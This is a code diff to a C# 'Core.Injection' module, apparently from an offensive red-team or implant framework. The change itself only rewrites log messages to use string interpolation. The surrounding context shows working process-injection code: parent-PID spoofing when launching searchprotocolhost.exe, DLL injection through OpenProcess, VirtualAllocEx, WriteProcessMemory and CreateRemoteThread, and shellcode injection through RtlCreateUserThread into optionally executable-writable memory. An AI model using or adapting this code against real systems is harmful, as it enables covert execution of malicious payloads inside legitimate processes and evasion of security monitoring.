@@ -30,13 +30,13 @@ namespace Core.Injection
                 if (args.Length < 3)
                 {
                     path = @"c:\windows\system32\searchprotocolhost.exe";
-                    Console.WriteLine(" > [-] Missing Path or PID parameter starting process: " + path);
+                    Console.WriteLine($" > [-] Missing Path or PID parameter starting process: {path}");
                     pid = (int) SharpCreateProcess(ppid, path, true);
                 }
                 else
                 {
                     path = args[2].Replace("\"", "");
-                    Console.WriteLine(" > [+] Injecting into: " + path);
+                    Console.WriteLine($" > [+] Injecting into: {path}");
                     if (!int.TryParse(args[2], out pid))
                     {
                         if (args.Length > 3)
@@ -44,7 +44,7 @@ namespace Core.Injection
                             int.TryParse(args[3], out ppid);
                         }
 
-                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
+                        Console.WriteLine($" > [+] Spoofing ppid: {ppid}");
                         pid = (int) SharpCreateProcess(ppid, path, true);
                     }
                 }
@@ -54,7 +54,7 @@ namespace Core.Injection
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error: " + e);
+                Console.WriteLine($"[-] Error: {e}");
             }
         }
 
@@ -69,13 +69,13 @@ namespace Core.Injection
                 if (args.Length < 3)
                 {
                     path = @"c:\windows\system32\searchprotocolhost.exe";
-                    Console.WriteLine("[-] Missing Path or PID parameter using " + path);
+                    Console.WriteLine($"[-] Missing Path or PID parameter using {path}");
                     pid = (int) SharpCreateProcess(ppid, path, true);
                 }
                 else
                 {
                     path = args[2].Replace("\"", "");
-                    Console.WriteLine(" > [+] Injecting into: " + path);
+                    Console.WriteLine($" > [+] Injecting into: {path}");
                     if (!int.TryParse(args[2], out pid))
                     {
                         if (args.Length > 3)
@@ -83,17 +83,17 @@ namespace Core.Injection
                             int.TryParse(args[3], out ppid);
                         }
 
-                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
+                        Console.WriteLine($" > [+] Spoofing ppid: {ppid}");
                         pid = (int) SharpCreateProcess(ppid, path, true);
                     }
                 }
 
                 var payload = args[1].Replace("\"", "");
 
-                Console.WriteLine($" > [+] Injecting DLL ({payload}) into PID: " + pid);
+                Console.WriteLine($" > [+] Injecting DLL ({payload}) into PID: {pid}");
 
                 var hProcess = Internals.OpenProcess(Internals.PROCESS_ALL_ACCESS, false, (uint) pid);
-                Console.WriteLine(" > [+] OpenProcess hProcess: " + hProcess);
+                Console.WriteLine($" > [+] OpenProcess hProcess: {hProcess}");
 
                 var allocMemAddress = Internals.VirtualAllocEx(hProcess, IntPtr.Zero, (payload.Length + 1) * Marshal.SizeOf(typeof(char)),
                     Internals.MEM_COMMIT | Internals.MEM_RESERVE,
@@ -111,31 +111,31 @@ namespace Core.Injection
 
                 Internals.WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(payload), (payload.Length + 1) * Marshal.SizeOf(typeof(char)), out _);
 
-                Console.WriteLine(" > [+] CreateRemoteThread: " + procAddress);
+                Console.WriteLine($" > [+] CreateRemoteThread: {procAddress}");
                 var hThread = Internals.CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, allocMemAddress, 0, IntPtr.Zero);
 
                 if (hThread == IntPtr.Zero)
                 {
-                    Console.WriteLine(" > [-] Error: CreateRemoteThread failed > LastError: " + Marshal.GetLastWin32Error());
+                    Console.WriteLine($" > [-] Error: CreateRemoteThread failed > LastError: {Marshal.GetLastWin32Error()}");
                 }
 
                 if (Marshal.GetLastWin32Error() != 0)
                 {
-                    Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
+                    Console.WriteLine($" > LastError: {Marshal.GetLastWin32Error()}");
                 }
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error: " + e);
+                Console.WriteLine($"[-] Error: {e}");
             }
         }
 
         internal static void RtlCreateUserThreadInjection(int pid32, byte[] payload32, bool rwx = false)
         {
-            Console.WriteLine(" > [+] Injecting into PID: " + pid32);
+            Console.WriteLine($" > [+] Injecting into PID: {pid32}");
             var hProcess = Internals.OpenProcess(Internals.PROCESS_ALL_ACCESS, false, (uint) pid32);
 
-            Console.WriteLine(" > [+] OpenProcess hProcess:  0x" + $"{hProcess.ToInt64():X8}");
+            Console.WriteLine($" > [+] OpenProcess hProcess:  0x{hProcess.ToInt64():X8}");
             var size = payload32.Length * 2;
 
             var protect = rwx ? Internals.PAGE_EXECUTE_READWRITE : Internals.PAGE_READWRITE;
@@ -147,7 +147,7 @@ namespace Core.Injection
                 return;
             }
 
-            Console.WriteLine($" > [+] VirtualAllocEx {(rwx ? "RWX" : "RW")}: 0x" + $"{hBaseAddress.ToInt64():X8}");
+            Console.WriteLine($" > [+] VirtualAllocEx {(rwx ? "RWX" : "RW")}: 0x{hBaseAddress.ToInt64():X8}");
             if (Internals.WriteProcessMemory(hProcess, hBaseAddress, payload32, payload32.Length, out _))
             {
                 Console.WriteLine(" > [+] WriteProcessMemory succeeded");
@@ -168,21 +168,21 @@ namespace Core.Injection
                 if (hintThread != 0)
                 {
                     var hThread = Internals.CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
-                    Console.WriteLine(" > [-] RtlCreateUserThread Failed - Failing over to CreateRemoteThread: " + hThread);
+                    Console.WriteLine($" > [-] RtlCreateUserThread Failed - Failing over to CreateRemoteThread: {hThread}");
                     if (hThread == IntPtr.Zero)
                     {
-                        Console.WriteLine(" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: " + hThread);
+                        Console.WriteLine($" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: {hThread}");
                         Util.CreateRemoteThread64((uint) hProcess.ToInt32(), (uint) hBaseAddress.ToInt32(), 0);
                     }
 
                     var threadHandleClosed = Internals.CloseHandle(hThread);
-                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + threadHandleClosed);
+                    Console.WriteLine($" > [+] CloseHandle to Inject Thread: {threadHandleClosed}");
                 }
                 else
                 {
-                    Console.WriteLine(" > [+] RtlCreateUserThread Injection: " + tHandle);
+                    Console.WriteLine($" > [+] RtlCreateUserThread Injection: {tHandle}");
                     var closedHandle = Internals.CloseHandle(tHandle);
-                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + closedHandle);
+                    Console.WriteLine($" > [+] CloseHandle to Inject Thread: {closedHandle}");
                 }
             }
             else
@@ -219,11 +219,11 @@ namespace Core.Injection
             }
 
             var closed = Internals.CloseHandle(hProcess);
-            Console.WriteLine(" > [+] Close handle Process: " + closed);
+            Console.WriteLine($" > [+] Close handle Process: {closed}");
 
             if (Marshal.GetLastWin32Error() != 0)
             {
-                Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
+                Console.WriteLine($" > LastError: {Marshal.GetLastWin32Error()}");
             }
         }
 
@@ -291,13 +291,13 @@ namespace Core.Injection
                 // Close process and thread handles
                 if (pInfo.hThread != IntPtr.Zero)
                 {
-                    Console.WriteLine(" > [+] CloseHandle hThread: 0x" + $"{pInfo.hThread.ToInt64():X}");
+                    Console.WriteLine($" > [+] CloseHandle hThread: 0x{pInfo.hThread.ToInt64():X}");
                     Internals.CloseHandle(pInfo.hThread);
                 }
 
                 if (pInfo.hProcess != IntPtr.Zero)
                 {
-                    Console.WriteLine(" > [+] CloseHandle hProcess: 0x" + $"{pInfo.hProcess.ToInt64():X}");
+                    Console.WriteLine($" > [+] CloseHandle hProcess: 0x{pInfo.hProcess.ToInt64():X}");
                     Internals.CloseHandle(pInfo.hProcess);
                 }
             }
